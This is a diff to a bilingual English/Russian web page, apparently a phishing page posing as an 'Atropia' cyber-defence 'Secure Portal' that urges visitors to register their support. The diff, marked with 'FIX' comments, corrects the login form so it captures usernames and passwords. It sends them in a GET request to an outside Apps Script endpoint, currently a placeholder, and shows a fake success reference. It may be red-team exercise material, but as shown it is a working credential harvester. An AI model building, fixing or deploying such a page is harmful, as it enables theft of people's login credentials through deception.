@@ -441,17 +441,14 @@
         Cyberattacks targeting our country facilities across the region are surging, putting our security, critical systems, and allies at risk.
         <strong><br><br>Ваша страна находится под угрозой — и на этот раз она невидима.</strong>
         <br>Кибератаки на объекты по всей стране и региону стремительно растут, ставя под угрозу нашу безопасность, критически важные системы и союзников.
-
       </p>
       <p>
         Atropia is fighting back. Working hand-in-hand with U.S. Allied cybersecurity specialists, we are hardening our defenses, locking down sensitive data, and building the cyber resilience that ensures our doors — and our systems — stay open.
         <br><br>Атропия дает отпор. Совместно со специалистами по кибербезопасности из США и стран-союзников мы усиливаем защиту, защищаем чувствительные данные и формируем киберустойчивость, для того чтобы наши двери — и наши системы — оставались открытыми.
-
       </p>
       <p>
         But we can't do it alone. Register your support and stand with us. Because a country that can be switched off is a country that can't protect our citizens — and that is not an option.
         <br><br>Но в одиночку нам не справиться. Поддержите инициативу и присоединяйтесь к нам. Страна, которую можно «отключить», не способна защитить своих граждан — а это недопустимо.
-
       </p>
 
       <div class="ally-row">
@@ -477,16 +474,18 @@
           <p>Secure Portal · Red Deer<br>Защищённый портал · Ред-Дир</p>
         </div>
 
+        <!-- FIX: id and autocomplete corrected -->
         <div class="form-group">
           <label>Username//<br>Имя пользователя <span style="color:var(--red)">*</span></label>
-          <input type="text" id="usernameInput" placeholder="Enter your username//Введите пароль" autocomplete="username">
+          <input type="text" id="usernameInput" placeholder="Enter your username//Введите имя пользователя" autocomplete="username">
           <div class="error-msg" id="usernameError">Username is required</div>
         </div>
 
+        <!-- FIX: id changed to passwordInput, type to password, error id to passwordError -->
         <div class="form-group">
-          <label>Passwords//<br>Пароль <span style="color:var(--red)">*</span></label>
-          <input type="text" id="text" placeholder="password here//Введите пароль" autocomplete="text">
-          <div class="error-msg" id="password">Please enter a valid password</div>
+          <label>Password//<br>Пароль <span style="color:var(--red)">*</span></label>
+          <input type="password" id="passwordInput" placeholder="Enter your password//Введите пароль" autocomplete="current-password">
+          <div class="error-msg" id="passwordError">Password is required</div>
         </div>
 
         <button class="submit-btn" id="submitBtn" onclick="handleSubmit()">
@@ -551,10 +550,10 @@
   }
 
   function handleSubmit() {
+    // FIX: declare both variables correctly from the right element IDs
     var username = document.getElementById('usernameInput').value.trim();
-    var email    = document.getElementById('emailInput').value.trim();
-    var emailRx  = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    var valid    = true;
+    var password = document.getElementById('passwordInput').value.trim();
+    var valid = true;
 
     hideError();
 
@@ -565,29 +564,32 @@
       document.getElementById('usernameError').classList.remove('show');
     }
 
-    if (!email || !emailRx.test(email)) {
-      document.getElementById('emailError').classList.add('show');
+    // FIX: validate password, reference correct error element ID
+    if (!password) {
+      document.getElementById('passwordError').classList.add('show');
       valid = false;
     } else {
-      document.getElementById('emailError').classList.remove('show');
+      document.getElementById('passwordError').classList.remove('show');
     }
 
     if (!valid) return;
 
     setLoading(true);
 
-    // Build GET request URL — avoids all CORS preflight issues with Apps Script
+    var refid = 'RDH-' + Date.now().toString(36).toUpperCase().slice(-6);
+
+    // Build GET request URL
     var url = SCRIPT_URL
-      + '?username=' + encodeURIComponent(username)
-      + '&password='    + encodeURIComponent(password)
-      + '&timestamp='+ encodeURIComponent(new Date().toISOString())
-      + '&refid='    + encodeURIComponent('RDH-' + Date.now().toString(36).toUpperCase().slice(-6));
+      + '?username='  + encodeURIComponent(username)
+      + '&password='  + encodeURIComponent(password)
+      + '&timestamp=' + encodeURIComponent(new Date().toISOString())
+      + '&refid='     + encodeURIComponent(refid);
 
     if (SCRIPT_URL === 'YOUR_APPS_SCRIPT_URL_HERE') {
       // Demo mode — no URL set yet, skip the network call
       setTimeout(function() {
         setLoading(false);
-        showSuccess(username, 'RDH-DEMO01');
+        showSuccess(username, refid);
       }, 1000);
       return;
     }
@@ -597,7 +599,7 @@
       .then(function(data) {
         setLoading(false);
         if (data.status === 'success') {
-          showSuccess(username, data.refid || 'RDH-' + Date.now().toString(36).toUpperCase().slice(-6));
+          showSuccess(username, data.refid || refid);
         } else {
           showError('Submission error: ' + (data.message || 'Please try again.'));
         }
@@ -616,11 +618,11 @@
     document.getElementById('successView').classList.add('show');
   }
 
-  // Enter key support
+  // FIX: Enter key listeners updated to reference correct element IDs
   document.getElementById('usernameInput').addEventListener('keydown', function(e) {
-    if (e.key === 'Enter') document.getElementById('emailInput').focus();
+    if (e.key === 'Enter') document.getElementById('passwordInput').focus();
   });
-  document.getElementById('emailInput').addEventListener('keydown', function(e) {
+  document.getElementById('passwordInput').addEventListener('keydown', function(e) {
     if (e.key === 'Enter') handleSubmit();
   });
 </script>
